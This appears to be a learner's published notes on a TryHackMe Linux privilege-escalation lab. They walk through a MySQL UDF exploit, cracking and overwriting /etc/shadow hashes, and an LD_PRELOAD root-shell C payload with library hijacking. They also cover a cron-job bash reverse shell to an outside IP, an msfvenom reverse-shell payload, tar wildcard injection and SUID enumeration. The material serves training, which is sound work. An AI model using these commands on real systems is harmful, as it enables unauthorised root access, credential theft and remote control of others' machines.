---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-04T18:29:28.281+02:00","dg-note-properties":{}}
---

![](/img/user/Attachments/redteaming2.png)
## Description

This room demonstrates various basic techniques on how to escalate privileges in linux environment. 

Techniques include: 
1. Service Exploits
2. Weak File Permissions
3. Shell Escape Sequences
4. Environmental Variables Vulnerabiltiies
5. 

## Initial Access

Following THM instructions and connecting to the target as per the command below. As suspeted OpenSSH have deprecated ssh-rsa so the extra argument is necessary. 

**Command**
`ssh user@TARGET -oHostKeyAlgorithms=+ssh-rsa`

__________

## Service Exploits 

Entering the directory : 

**Command**
`cd /home/user/tools/mysql-udf`

Compiling the **.c** file

**Command**
`gcc -g -c raptor_udf2.c -fPIC

**Command**`
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Connecting to mysql service as root with blank password

![](/img/user/Attachments/dbconnect.png)

Executing the commands as per the THM instructions

```
use mysql; 

create table foo(line blob);

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

## use the function to copy
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![](/img/user/Attachments/exploit_commands.png)

Now using the exploit to gain root privileges

**Command**
`/tmp/rootbash -p`

![](/img/user/Attachments/firstroot.png)

Now deleting the exploit and exiting the shell

**Command**
`rm /tmp/rootbash`

______

## Weak File Permissions - Readable /etc/shadow

reading the `/etc/shadow` file which should only readable by **root**

**Command**
`ls -l /etc/shadow`

![](/img/user/Attachments/etcshadow.png)

Reading the content of /etc/shadow

**Command**
`cat /etc/shadow`

![](/img/user/Attachments/etcshadow-content.png)

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Now saving **root** hash into a file and using **john** to crack it. 

**Command**
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](/img/user/Attachments/roothashcrack.png)

Now switching to root is a walk in the park `su root`

![](/img/user/Attachments/root2.png)


---------

## Weak File Permissions - Writeable /etc/shadow


Now generating a new password hash `mkpasswd -m sha-512 PASS`

```
# make new hash
mkpasswd -m sha-512 toor1

$6$WNY/fRw3Uz$78unWndGWjkB5JHWow1DBM51GwkZGaqXhTsqjStq.2X9VDSZ5DEp1gn6gE9ZbeCAoqEaFKpJzqkDQQaJYWfDW1
```

And pasting into `/etc/shadow` for root user. 

```

# Updating the old password. 
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.  
jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```

Password is inserted between first colon to the left and first colon to the right.

First number sequence coming after the first colon is the **timestamp** for last changed date

-----------

## Weak File Permissions - Writeable /etc/passwd

#### Breakdown of File Permissions

```
-  rw-  r--  rw-
│   │    │    │
│   │    │    └── Other (everyone else) → read + write
│   │    └─────── Group (shadow group)  → read only
│   └──────────── Owner (root)          → read + write
└──────────────── File type (- = regular file)
```

Once again **/etc/passwd** is world-writeable.

**Command**
`ls -l /etc/passwd` 

As is seen by the weak file permissions `-rw-r--rw-`

Generating a new password hash with openssl `openssl passwd toor1`
hash: `qkeUSxWTs4PU6`

-----------

## Sudo - Shell Escape Sequences

Checking how many programs **user** is allowed to run with sudo

**Command**
`sudo -l`

![](/img/user/Attachments/userrunsudo.png)

----------

## Sudo - Environmental Variables

Checking which environment variables can be inherited from **user** environment

**Command**
`sudo -l`

![](/img/user/Attachments/env-vars.png)

**What is LD_PRELOAD?**
```

When Linux runs a program, it loads shared libraries (`.so` files) that the program needs. `LD_PRELOAD` is an environment variable that tells the dynamic linker to load the SPECIFIED shared object **before any other library** — even before standard ones like `libc`.
```

### Breakdown of Environmental Variables Vulnerability 

**Dynamic Linker**
Dynamic linker is an app which runs every time a binary is executed

**Why LD_PRELOAD is Exploitable**
Normally `LD_PRELOAD` is ignored when running with `sudo` for security reasons. But `sudo -l` shows it. This means sudo is **explicitly configured to preserve** `LD_PRELOAD` — a serious misconfiguration.

**What preload.c Does**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");  // remove LD_PRELOAD to avoid loops
    setresuid(0,0,0);        // set uid to root (0)
    setresgid(0,0,0);        // set gid to root (0)
    system("/bin/bash -p");  // spawn bash with root privileges
}
```


`_init()` is a special function that runs **automatically when a shared library is loaded** — before anything else. So when sudo loads the `.so` file, it immediately runs the code with root privileges.

### Visualisation of the Exploitation Process

```
sudo LD_PRELOAD=/tmp/preload.so find
         │
         ├── sudo sees env_keep+=LD_PRELOAD
         ├── sudo runs find as root
         ├── Linux loader loads /tmp/preload.so FIRST
         ├── _init() executes automatically
         ├── setresuid(0,0,0) → you are now root
         └── /bin/bash -p spawns → root shell
```

### Visualisation of Dynamic Linking 

```
You run: ./myprogram
         │
         ├── Kernel loads the binary
         ├── Kernel sees "needs dynamic linker"
         ├── Kernel loads /lib64/ld-linux.so (the dynamic linker)
         ├── Dynamic linker reads program's library dependencies
         ├── Dynamic linker searches for each library in:
         │     1. LD_PRELOAD (if set)       ← exploit entry point
         │     2. LD_LIBRARY_PATH (if set)  ← exploit entry point
         │     3. /etc/ld.so.cache
         │     4. /lib
         │     5. /usr/lib
         ├── Loads each library into memory
         ├── Resolves all function references
         └── Transfers control to your program
```


----------

### Task 
Create a shared object using the code located at /home/user/tools/sudo/preload.c:

**Command**
`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Now while setting the `LD_PRELOAD` environment variable to the full new path of the object im selecting a program that can be run with **sudo** privs as **user** 

**Command**
`sudo LD_PRELOAD=/tmp/preload.so find`

And now root shell spawns 

![](/img/user/Attachments/root-spawn.png)

After exiting root shell now im checking which shared libraries are used by `apache2` by running **ldd** against it 

**Command**
`ldd /usr/sbin/apache2`

**What `*ldd /usr/sbin/apache2*` is doing**
`ldd` lists all shared libraries a program depends on. You run it to find library names you can hijack — you need to name your malicious `.so` file exactly the same as a real library apache2 uses.

![](/img/user/Attachments/libs2hijack.png)


**Command**
`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Now running the apache2 with the **user's** sudo privs whilst specifying the path to which the malicious code is saved at

![](/img/user/Attachments/root3.png)

-----------

## Cron Jobs - File Permissions 

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

Viewing the cr0ntabz

**Command**
`cat /etc/crontab`

![](/img/user/Attachments/crontab.png)

So 2 cronjobs are scheduled 

Locating overwrite.sh 

**Command**
`locate overwrite.sh`

And checking again for weak file permissions

![](/img/user/Attachments/overwrite.png)

Replacing the content of the file with 
`bash -i >& /dev/tcp/192.168.141.140/4444 0>&1`

with **nc** running sends back a **root** shell 

-----------

## Cron Jobs - PATH Environmental Variables

The path starts with **/home/user/** 
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

Creating a *overwrite.sh* file in the home directory within the ssh connection 

```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

Making it executable

**Command**
`chmod +x /home/user/overwrite.sh`

Running `/tmp/rootbash -p` upgrades the shell to root

Removing the file

`rm /tmp/rootbash`

----------------


## Cron Jobs - Wildcards


Checking **compress.sh** in the other cron job and seeing it uses `*` in the home directory

**Command**
`cat /usr/local/bin/compress.sh`

Creating the exploit on local machine as per THM instructions

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.141.140 LPORT=4444 -f elf -o shell.elf
```

Making it executable
`chmod +x /home/user/shell.elf`

Transferring the file to target via Python HTTP server. 

Creating 2 files in home directory on ssh-box

**Command**
`touch /home/user/--checkpoint=1`

**Command**
`touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

-----------

## SUID / SGID Executables - Known Exploits 

Find all the SUID/SGID executables on the Debian :

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  
2> /dev/null  
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry  
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent  
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh  
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo  
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write  
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab  
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp  
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit  
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage  
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd  
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn  
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall  
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so  
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env  
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2  
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3  
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device  
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown  
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6  
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping  
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount  
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su  
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount  
-rwsr-sr-x 1 root root 926536 Apr  4 12:28 /tmp/rootbash  
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd  
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```























